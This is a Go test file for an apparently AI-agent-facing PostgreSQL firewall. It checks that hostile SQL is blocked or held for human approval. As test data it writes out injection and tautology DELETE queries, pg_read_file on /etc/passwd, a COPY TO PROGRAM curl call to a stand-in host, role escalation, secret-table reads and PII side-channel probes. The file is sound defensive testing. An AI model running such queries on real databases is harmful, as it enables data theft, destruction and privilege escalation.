package firewall

import (
	"testing"

	"github.com/duhanguler/pgveil/internal/policy"
)

func testAIAgentProfile() *policy.RoleProfile {
	return &policy.RoleProfile{
		Name: "ai_agent",
		Firewall: policy.FirewallPolicy{
			AllowStatements:         []string{"SELECT", "EXPLAIN", "SHOW"},
			BlockDDL:                true,
			BlockMultiStatement:     true,
			BlockWriteWithoutWhere:  true,
			BlockDangerousFunctions: true,
			BlockSystemCatalogs:     true,
			BlockPIIInference:       true,
			ProtectedColumns:        []string{"tckn", "ssn", "iban", "card_number", "secret_value"},
			RequireHITLStatements:   []string{"UPDATE", "DELETE", "INSERT"},
			HITLMode:                "hold",
			DeniedTables:            []string{"api_secrets", "pg_shadow", "pg_authid"},
			MaxRows:                 25,
			MaxRowsAction:           "truncate",
		},
	}
}

func TestASTFirewallEnforcements(t *testing.T) {
	prof := testAIAgentProfile()

	cases := []struct {
		name       string
		sql        string
		wantAction Action
		wantRule   string
	}{
		{
			name:       "safe customer select",
			sql:        "SELECT id, full_name, email FROM customers WHERE city = 'Istanbul' LIMIT 10",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "drop table DDL blocked",
			sql:        "DROP TABLE orders",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "truncate table blocked",
			sql:        "TRUNCATE TABLE customers CASCADE",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "multi-statement SQL injection blocked",
			sql:        "SELECT id FROM customers LIMIT 1; DROP TABLE orders;",
			wantAction: ActionBlock,
			wantRule:   "block_multi_statement",
		},
		{
			name:       "delete without where blocked",
			sql:        "DELETE FROM orders",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "delete with 1=1 tautology blocked",
			sql:        "DELETE FROM orders WHERE 1 = 1",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "update with OR true tautology blocked",
			sql:        "UPDATE orders SET status = 'cancelled' WHERE id = 5 OR true",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "modifying CTE bypass caught as HITL or blocked",
			sql:        "WITH wiped AS (DELETE FROM orders WHERE id = 1001 RETURNING *) SELECT * FROM wiped",
			wantAction: ActionRequireHITL,
			wantRule:   "require_hitl_delete",
		},
		{
			name:       "modifying CTE without WHERE blocked",
			sql:        "WITH wiped AS (DELETE FROM orders RETURNING *) SELECT * FROM wiped",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "scoped update triggers HITL approval",
			sql:        "UPDATE orders SET status = 'refunded' WHERE id = 1001",
			wantAction: ActionRequireHITL,
			wantRule:   "require_hitl_update",
		},
		{
			name:       "pg_read_file blocked",
			sql:        "SELECT pg_read_file('/etc/passwd')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "nested dangerous function inside COALESCE blocked",
			sql:        "SELECT COALESCE(pg_ls_dir('.'), 'x')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "COPY TO PROGRAM RCE blocked",
			sql:        "COPY orders TO PROGRAM 'curl http://evil.example'",
			wantAction: ActionBlock,
			wantRule:   "block_copy_program",
		},
		{
			name:       "DO anonymous block blocked",
			sql:        "DO $$ BEGIN PERFORM 1; END $$;",
			wantAction: ActionBlock,
			wantRule:   "block_do_block",
		},
		{
			name:       "SET ROLE escalation blocked",
			sql:        "SET ROLE postgres",
			wantAction: ActionBlock,
			wantRule:   "block_role_escalation",
		},
		{
			name:       "restricted table api_secrets blocked",
			sql:        "SELECT service_name, secret_value FROM public.api_secrets",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "restricted table hidden inside subquery blocked",
			sql:        "SELECT * FROM (SELECT secret_value FROM api_secrets) s",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "system catalog pg_shadow blocked",
			sql:        "SELECT usename, passwd FROM pg_catalog.pg_shadow",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "driver transaction BEGIN allowed",
			sql:        "BEGIN",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "PII side-channel WHERE LIKE probe blocked",
			sql:        "SELECT id, full_name FROM customers WHERE tckn LIKE '100000%'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel SUBSTRING alias bypass blocked",
			sql:        "SELECT id, SUBSTRING(iban, 1, 8) AS prefix FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel ORDER BY masked column blocked",
			sql:        "SELECT id, city FROM customers ORDER BY tckn ASC",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel string concat alias evasion blocked",
			sql:        "SELECT id, tckn || '' AS raw_id FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel CASE oracle probe blocked",
			sql:        "SELECT id, CASE WHEN ssn = '123-45-6789' THEN 1 ELSE 0 END FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel SELECT LIKE projection probe blocked",
			sql:        "SELECT id, tckn LIKE '100000%' AS hit FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel SELECT greater-than oracle blocked",
			sql:        "SELECT id, tckn > '10000000000' AS hi FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel aggregate FILTER bypass blocked",
			sql:        "SELECT COUNT(*) FILTER (WHERE tckn LIKE '100000%') FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel WINDOW ORDER BY bypass blocked",
			sql:        "SELECT id, ROW_NUMBER() OVER (ORDER BY tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel DISTINCT ON bypass blocked",
			sql:        "SELECT DISTINCT ON (tckn) id FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel bytea cast hex exfiltration blocked",
			sql:        "SELECT id, tckn::bytea FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "PII side-channel EXPLAIN row-estimate oracle blocked",
			sql:        "EXPLAIN SELECT id FROM customers WHERE tckn = '10000000146'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "VALUES dangerous function bypass blocked",
			sql:        "VALUES (pg_read_file('/etc/passwd'))",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "table_to_xml denied table bypass blocked",
			sql:        "SELECT table_to_xml('api_secrets', true, false, '')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "set_config role escalation bypass blocked",
			sql:        "SELECT set_config('role', 'postgres', false)",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "pg_stats planner PII statistics leak blocked",
			sql:        "SELECT most_common_vals FROM pg_stats WHERE tablename = 'customers'",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},
		{
			name:       "pg_stat_activity live SQL leak blocked",
			sql:        "SELECT query FROM pg_stat_activity",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},
		{
			name:       "SELECT INTO table creation blocked as DDL",
			sql:        "SELECT id INTO evil_copy FROM customers",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "SET row_security off blocked as privilege escalation",
			sql:        "SET row_security = off",
			wantAction: ActionBlock,
			wantRule:   "block_role_escalation",
		},
		{
			name:       "DELETE tautology 2 > 1 blocked",
			sql:        "DELETE FROM orders WHERE 2 > 1",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE tautology self-equality id = id blocked",
			sql:        "DELETE FROM orders WHERE id = id",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE tautology NOT (1 = 2) blocked",
			sql:        "DELETE FROM orders WHERE NOT (1 = 2)",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE tautology 1 IN (1, 2) blocked",
			sql:        "DELETE FROM orders WHERE 1 IN (1, 2)",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "PREPARE unscoped DELETE bypass blocked",
			sql:        "PREPARE p AS DELETE FROM orders WHERE 1 = 1",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "PREPARE denied table bypass blocked",
			sql:        "PREPARE p AS SELECT * FROM api_secrets",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dec := Evaluate(tc.sql, prof)
			if dec.Action != tc.wantAction {
				t.Fatalf("SQL=%q\ngot action=%s (rule=%s reason=%q)\nwant action=%s (rule=%s)",
					tc.sql, dec.Action, dec.Rule, dec.Reason, tc.wantAction, tc.wantRule)
			}
			if tc.wantRule != "" && dec.Rule != tc.wantRule {
				t.Errorf("got rule=%q want %q", dec.Rule, tc.wantRule)
			}
		})
	}
}

func TestTargetColumnProvenanceForAliases(t *testing.T) {
	prof := testAIAgentProfile()
	dec := Evaluate("SELECT id, full_name AS display_name, email AS contact FROM customers LIMIT 5", prof)
	if dec.Action != ActionAllow {
		t.Fatalf("expected ALLOW, got %+v", dec)
	}
	if len(dec.TargetSources) != 3 {
		t.Fatalf("expected 3 target sources, got %+v", dec.TargetSources)
	}
	if len(dec.AliasSources["display_name"]) == 0 || dec.AliasSources["display_name"][0] != "full_name" {
		t.Fatalf("expected display_name alias to map to full_name, got %+v", dec.AliasSources)
	}
	if len(dec.AliasSources["contact"]) == 0 || dec.AliasSources["contact"][0] != "email" {
		t.Fatalf("expected contact alias to map to email, got %+v", dec.AliasSources)
	}
}

func BenchmarkEvaluateAST(b *testing.B) {
	prof := testAIAgentProfile()
	q := "SELECT c.id, c.full_name, c.email, o.order_number, o.total_amount FROM customers c JOIN orders o ON o.customer_id = c.id WHERE c.city = 'Istanbul' ORDER BY o.created_at DESC LIMIT 20"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Evaluate(q, prof)
	}
}
